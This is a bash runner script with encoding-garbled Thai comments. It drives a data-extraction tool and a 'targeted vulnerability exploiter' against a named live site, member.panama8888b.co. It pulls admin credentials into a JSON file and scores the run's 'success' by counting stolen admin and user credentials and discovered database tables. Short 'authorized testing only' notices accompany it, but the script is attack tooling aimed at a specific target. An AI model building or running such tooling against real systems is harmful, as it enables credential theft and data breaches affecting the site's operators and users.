#!/bin/bash

# Real Data Extraction Runner - Team B Panama8888b
# ‡∏™‡∏Ñ‡∏£‡∏¥‡∏õ‡∏ï‡πå‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà‡∏ó‡∏µ‡πà‡∏û‡∏ö‡πÉ‡∏ô OWASP ZAP
# ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏: ‡πÉ‡∏ä‡πâ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö‡∏≠‡∏ô‡∏∏‡∏ç‡∏≤‡∏ï‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô

echo "üî• Real Data Extraction - Team B Panama8888b"
echo "üìã ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö Panama8888b"
echo "‚ö†Ô∏è  ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏: ‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏ô‡∏µ‡πâ‡∏à‡∏∞‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö"
echo "=============================================================="

# ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á dependencies
echo "üîç ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö Dependencies..."

if ! command -v python3 &> /dev/null; then
    echo "‚ùå Error: Python3 ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á"
    exit 1
fi

if ! python3 -c "import requests" 2>/dev/null; then
    echo "üì¶ ‡∏ï‡∏¥‡∏î‡∏ï‡∏±‡πâ‡∏á requests..."
    sudo apt-get update
    sudo apt-get install -y python3-requests
fi

# ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ permissions
echo "üîß ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ permissions..."
chmod +x *.py
chmod +x *.sh

# ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÇ‡∏ü‡∏•‡πÄ‡∏î‡∏≠‡∏£‡πå‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
mkdir -p results
mkdir -p backups

# Backup ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÄ‡∏Å‡πà‡∏≤
if [ -f "real_data_extraction_results.json" ]; then
    echo "üíæ Backup ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÄ‡∏Å‡πà‡∏≤..."
    mv real_data_extraction_results.json "backups/real_data_extraction_results_$(date +%Y%m%d_%H%M%S).json"
fi

echo ""
echo "üéØ ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á..."
echo "=============================================================="

# 1. ‡∏£‡∏±‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏´‡∏•‡∏±‡∏Å
echo "üìä 1/3 - ‡∏£‡∏±‡∏ô Real Data Extractor..."
python3 real_data_extractor.py

if [ $? -eq 0 ]; then
    echo "‚úÖ Real Data Extractor ‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô"
else
    echo "‚ùå Real Data Extractor ‡∏°‡∏µ‡∏õ‡∏±‡∏ç‡∏´‡∏≤"
fi

echo ""

# 2. ‡∏£‡∏±‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á
echo "üéØ 2/3 - ‡∏£‡∏±‡∏ô Targeted Vulnerability Exploiter..."
python3 targeted_vulnerability_exploiter.py

if [ $? -eq 0 ]; then
    echo "‚úÖ Targeted Exploiter ‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô"
else
    echo "‚ùå Targeted Exploiter ‡∏°‡∏µ‡∏õ‡∏±‡∏ç‡∏´‡∏≤"
fi

echo ""

# 3. ‡∏£‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡πÄ‡∏â‡∏û‡∏≤‡∏∞
echo "üëë 3/3 - ‡∏£‡∏±‡∏ô Admin Data Extraction..."
python3 -c "
import sys
sys.path.append('.')
from targeted_vulnerability_exploiter import TargetedVulnExploiter
import json
from datetime import datetime

print('üîç ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡πÄ‡∏â‡∏û‡∏≤‡∏∞...')
exploiter = TargetedVulnExploiter()

# ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô
admin_data = exploiter.extract_admin_credentials_login()

if admin_data:
    print(f'‚úÖ ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin: {len(admin_data)} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£')
    
    # ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡πÅ‡∏¢‡∏Å‡∏ï‡πà‡∏≤‡∏á‡∏´‡∏≤‡∏Å
    admin_results = {
        'timestamp': datetime.now().isoformat(),
        'target': 'https://member.panama8888b.co',
        'extraction_type': 'admin_credentials_only',
        'admin_data': admin_data,
        'total_records': len(admin_data)
    }
    
    with open('admin_credentials_extracted.json', 'w', encoding='utf-8') as f:
        json.dump(admin_results, f, ensure_ascii=False, indent=2)
    
    print('üìÑ ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin ‡πÉ‡∏ô: admin_credentials_extracted.json')
else:
    print('‚ö†Ô∏è ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin')
"

echo ""
echo "=============================================================="
echo "üìä ‡∏™‡∏£‡∏∏‡∏õ‡∏ú‡∏•‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•"
echo "=============================================================="

# ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
total_files=0
total_size=0

if [ -f "real_data_extraction_results.json" ]; then
    echo "‚úÖ Real Data Extraction Results: ‡∏û‡∏ö"
    size=$(stat -c%s "real_data_extraction_results.json")
    echo "   üìÑ ‡∏Ç‡∏ô‡∏≤‡∏î‡πÑ‡∏ü‡∏•‡πå: $size bytes"
    total_files=$((total_files + 1))
    total_size=$((total_size + size))
fi

if [ -f "targeted_exploitation_results_$(date +%Y%m%d)*.json" ]; then
    echo "‚úÖ Targeted Exploitation Results: ‡∏û‡∏ö"
    for file in targeted_exploitation_results_*.json; do
        if [ -f "$file" ]; then
            size=$(stat -c%s "$file")
            echo "   üìÑ $file: $size bytes"
            total_files=$((total_files + 1))
            total_size=$((total_size + size))
        fi
    done
fi

if [ -f "admin_credentials_extracted.json" ]; then
    echo "‚úÖ Admin Credentials: ‡∏û‡∏ö"
    size=$(stat -c%s "admin_credentials_extracted.json")
    echo "   üìÑ ‡∏Ç‡∏ô‡∏≤‡∏î‡πÑ‡∏ü‡∏•‡πå: $size bytes"
    total_files=$((total_files + 1))
    total_size=$((total_size + size))
fi

echo ""
echo "üìà ‡∏™‡∏ñ‡∏¥‡∏ï‡∏¥‡∏£‡∏ß‡∏°:"
echo "   üìÅ ‡πÑ‡∏ü‡∏•‡πå‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î: $total_files ‡πÑ‡∏ü‡∏•‡πå"
echo "   üíæ ‡∏Ç‡∏ô‡∏≤‡∏î‡∏£‡∏ß‡∏°: $total_size bytes"

# ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡πÑ‡∏î‡πâ
echo ""
echo "üîç ‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡πÑ‡∏î‡πâ..."

python3 -c "
import json
import os

def analyze_extraction_results():
    results_summary = {
        'admin_credentials': 0,
        'user_credentials': 0,
        'database_tables': 0,
        'vulnerabilities_exploited': 0,
        'real_data_confirmed': False
    }
    
    # ‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡∏´‡∏•‡∏±‡∏Å
    if os.path.exists('real_data_extraction_results.json'):
        try:
            with open('real_data_extraction_results.json', 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            if 'extraction_results' in data:
                results = data['extraction_results']
                results_summary['admin_credentials'] = len(results.get('admin_credentials', []))
                results_summary['user_credentials'] = len(results.get('user_credentials', []))
                results_summary['database_tables'] = len(results.get('database_schema', {}))
                results_summary['vulnerabilities_exploited'] = len(results.get('vulnerabilities_exploited', []))
                
                # ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
                extracted_data = results.get('extracted_data', {})
                if extracted_data and len(extracted_data) > 0:
                    results_summary['real_data_confirmed'] = True
                    
        except Exception as e:
            print(f'‚ùå Error analyzing main results: {e}')
    
    # ‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå‡πÄ‡∏à‡∏≤‡∏∞‡∏à‡∏á
    for filename in os.listdir('.'):
        if filename.startswith('targeted_exploitation_results_') and filename.endswith('.json'):
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    
                if 'exploitation_summary' in data:
                    summary = data['exploitation_summary']
                    results_summary['admin_credentials'] += summary.get('admin_credentials_extracted', 0)
                    results_summary['user_credentials'] += summary.get('user_records_extracted', 0)
                    results_summary['database_tables'] += summary.get('database_tables_discovered', 0)
                    
            except Exception as e:
                print(f'‚ùå Error analyzing {filename}: {e}')
    
    # ‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• Admin
    if os.path.exists('admin_credentials_extracted.json'):
        try:
            with open('admin_credentials_extracted.json', 'r', encoding='utf-8') as f:
                data = json.load(f)
                
            admin_count = data.get('total_records', 0)
            if admin_count > 0:
                results_summary['admin_credentials'] = max(results_summary['admin_credentials'], admin_count)
                results_summary['real_data_confirmed'] = True
                
        except Exception as e:
            print(f'‚ùå Error analyzing admin data: {e}')
    
    # ‡πÅ‡∏™‡∏î‡∏á‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå
    print('üìä ‡∏™‡∏£‡∏∏‡∏õ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡πÑ‡∏î‡πâ:')
    print(f'   üëë Admin Credentials: {results_summary[\"admin_credentials\"]} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£')
    print(f'   üë• User Credentials: {results_summary[\"user_credentials\"]} ‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£')
    print(f'   üóÑÔ∏è Database Tables: {results_summary[\"database_tables\"]} ‡∏ï‡∏≤‡∏£‡∏≤‡∏á')
    print(f'   üéØ Vulnerabilities Exploited: {results_summary[\"vulnerabilities_exploited\"]} ‡∏à‡∏∏‡∏î')
    print(f'   ‚úÖ Real Data Confirmed: {\"Yes\" if results_summary[\"real_data_confirmed\"] else \"No\"}')
    
    # ‡∏õ‡∏£‡∏∞‡πÄ‡∏°‡∏¥‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
    success_score = 0
    if results_summary['admin_credentials'] > 0:
        success_score += 25
    if results_summary['user_credentials'] > 0:
        success_score += 25
    if results_summary['database_tables'] > 0:
        success_score += 25
    if results_summary['real_data_confirmed']:
        success_score += 25
        
    print(f'   üéØ Success Score: {success_score}/100')
    
    if success_score >= 75:
        print('   üéâ ‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡∏°‡∏≤‡∏Å!')
    elif success_score >= 50:
        print('   ‚úÖ ‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡∏ö‡∏≤‡∏á‡∏™‡πà‡∏ß‡∏ô')
    elif success_score >= 25:
        print('   ‚ö†Ô∏è ‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à‡∏ô‡πâ‡∏≠‡∏¢')
    else:
        print('   ‚ùå ‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÑ‡∏°‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à')

analyze_extraction_results()
"

echo ""
echo "=============================================================="
echo "üîí ‡∏Ñ‡∏≥‡πÄ‡∏ï‡∏∑‡∏≠‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢"
echo "=============================================================="
echo "‚ö†Ô∏è  ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ó‡∏µ‡πà‡∏î‡∏∂‡∏á‡∏°‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡∏à‡∏≤‡∏Å‡∏£‡∏∞‡∏ö‡∏ö"
echo "üîê ‡∏´‡πâ‡∏≤‡∏°‡πÉ‡∏ä‡πâ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ô‡∏µ‡πâ‡πÉ‡∏ô‡∏ó‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ú‡∏¥‡∏î"
echo "üìã ‡πÉ‡∏ä‡πâ‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏õ‡∏£‡∏∞‡πÄ‡∏°‡∏¥‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢"
echo "üóëÔ∏è  ‡∏Ñ‡∏ß‡∏£‡∏•‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ô‡∏µ‡πâ‡∏´‡∏•‡∏±‡∏á‡∏Å‡∏≤‡∏£‡∏õ‡∏£‡∏∞‡πÄ‡∏°‡∏¥‡∏ô‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô"

echo ""
echo "üìÅ ‡πÑ‡∏ü‡∏•‡πå‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå:"
ls -la *.json 2>/dev/null | grep -E "(real_data_extraction|targeted_exploitation|admin_credentials)" || echo "   ‡πÑ‡∏°‡πà‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ò‡πå"

echo ""
echo "‚úÖ ‡∏Å‡∏≤‡∏£‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏£‡∏¥‡∏á‡πÄ‡∏™‡∏£‡πá‡∏à‡∏™‡∏¥‡πâ‡∏ô!"
echo "=============================================================="